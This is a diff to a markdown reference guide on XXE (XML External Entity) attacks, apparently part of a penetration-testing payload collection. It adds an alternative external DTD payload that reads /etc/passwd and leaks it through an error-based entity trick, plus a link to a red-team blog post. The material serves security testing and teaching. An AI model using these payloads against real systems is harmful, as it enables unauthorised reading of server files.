@@ -320,6 +320,15 @@ The final payload becomes:
 %error;
 ```
 
+**Alternative content of ext.dtd**
+
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM '%data;:///'>">
+%eval;
+%leak;
+```
+
 Let's break down the payload:
 
 1. `<!ENTITY % file SYSTEM "file:///etc/passwd">`
@@ -330,6 +339,9 @@ Let's break down the payload:
   This line uses the eval entity, which causes the entity error to be defined.
 4. `%error;`
   Finally, this line uses the error entity, which attempts to access a nonexistent file with a path that includes the content of `/etc/passwd`. Since the file doesn't exist, an error will be thrown. If the application reports back the error to the user and includes the file path in the error message, then the content of `/etc/passwd` would be disclosed as part of the error message, revealing sensitive information.
+
+
+
 
 
 ## Exploiting blind XXE to exfiltrate data out-of-band
@@ -742,3 +754,4 @@ From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
 * [XXE: How to become a Jedi](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf) - Zeronights 2017 - Yaroslav Babin
 * [Payloads for Cisco and Citrix - Arseniy Sharoglazov](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
 * [Data exfiltration using XXE on a hardened server - Ritik Singh - Jan 29, 2022](https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)
+* [REDTEAM TALES 0X1: SOAPY XXE - Uncover and exploit XXE vulnerability in SOAP WS - optistream](https://www.optistream.io/blogs/tech/redteam-stories-1-soapy-xxe)
